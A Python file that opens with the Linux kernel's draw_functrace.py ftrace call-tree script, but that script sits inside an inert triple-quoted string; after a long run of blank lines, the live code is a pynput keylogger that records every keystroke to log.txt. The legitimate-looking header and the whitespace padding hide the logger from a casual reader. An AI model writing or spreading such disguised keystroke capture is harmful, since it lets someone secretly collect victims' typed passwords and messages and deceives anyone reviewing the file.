"""

#!/usr/bin/python

Copyright 2008 (c) Frederic Weisbecker <fweisbec@gmail.com>
Licensed under the terms of the GNU GPL License version 2
This script parses a trace provided by the function tracer in
kernel/trace/trace_functions.c
The resulted trace is processed into a tree to produce a more human
view of the call stack by drawing textual but hierarchical tree of
calls. Only the functions's names and the the call time are provided.
Usage:
	Be sure that you have CONFIG_FUNCTION_TRACER
	# mount -t debugfs nodev /sys/kernel/debug
	# echo function > /sys/kernel/debug/tracing/current_tracer
	$ cat /sys/kernel/debug/tracing/trace_pipe > ~/raw_trace_func
	Wait some times but not too much, the script is a bit slow.
	Break the pipe (Ctrl + Z)
	$ scripts/draw_functrace.py < raw_trace_func > draw_functrace
	Then you have your drawn trace in draw_functrace


import sys, re

class CallTree:
	ROOT = None

	def __init__(self, func, time = None, parent = None):
		self._func = func
		self._time = time
		if parent is None:
			self._parent = CallTree.ROOT
		else:
			self._parent = parent
		self._children = []

	def calls(self, func, calltime):
		child = CallTree(func, calltime, self)
		self._children.append(child)
		return child

	def getParent(self, func):
		tree = self
		while tree != CallTree.ROOT and tree._func != func:
			tree = tree._parent
		if tree == CallTree.ROOT:
			child = CallTree.ROOT.calls(func, None)
			return child
		return tree

	def __repr__(self):
		return self.__toString("", True)

	def __toString(self, branch, lastChild):
		if self._time is not None:
			s = "%s----%s (%s)\n" % (branch, self._func, self._time)
		else:
			s = "%s----%s\n" % (branch, self._func)

		i = 0
		if lastChild:
			branch = branch[:-1] + " "
		while i < len(self._children):
			if i != len(self._children) - 1:
				s += "%s" % self._children[i].__toString(branch +\
								"    |", False)
			else:
				s += "%s" % self._children[i].__toString(branch +\
								"    |", True)
			i += 1
		return s

class BrokenLineException(Exception):
	pass

class CommentLineException(Exception):
	pass


def parseLine(line):
	line = line.strip()
	if line.startswith("#"):
		raise CommentLineException
	m = re.match("[^]]+?\\] +([0-9.]+): (\\w+) <-(\\w+)", line)
	if m is None:
		raise BrokenLineException
	return (m.group(1), m.group(2), m.group(3))


def main():
	CallTree.ROOT = CallTree("Root (Nowhere)", None, None)
	tree = CallTree.ROOT

	for line in sys.stdin:
		try:
			calltime, callee, caller = parseLine(line)
		except BrokenLineException:
			break
		except CommentLineException:
			continue
		tree = tree.getParent(caller)
		tree = tree.calls(callee, calltime)

	print(CallTree.ROOT)


if __name__ == "__main__":
main()

# the main script

"""




















































































from pynput.keyboard import Listener


def on_press(key):
    keystroke = str(key)
    keystroke = keystroke.replace("'", "")

    if keystroke == 'Key.space':
        keystroke = ' '
    if keystroke == 'Key.enter':
        keystroke = '\n'
    if keystroke == 'Key.tab':
        keystroke = '\t'

    redundant = ['Key.shift', 'Key.ctrl', 'Key.shift_r', 'Key.shift_l', 'Key.ctrl_r', 'Key.ctrl_l',
                 'Key.backspace']

    if keystroke in redundant:
        keystroke = ''

    with open('log.txt', 'a') as f:
        f.write(keystroke)


with Listener(on_press=on_press) as listener:
    listener.join()
